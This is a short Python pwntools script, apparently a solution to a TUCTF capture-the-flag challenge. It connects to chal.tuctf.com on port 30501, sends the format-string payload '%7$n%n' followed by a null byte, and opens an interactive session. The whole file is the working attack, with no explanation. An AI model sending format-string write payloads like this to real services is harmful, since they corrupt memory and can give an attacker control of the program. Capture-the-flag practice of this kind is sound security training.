#coding: utf-8
from pwn import *

IP = "chal.tuctf.com"
PORT = 30501
r = remote(IP, PORT)

p = "%7$n%n\x00"

r.send(p)
r.interactive()
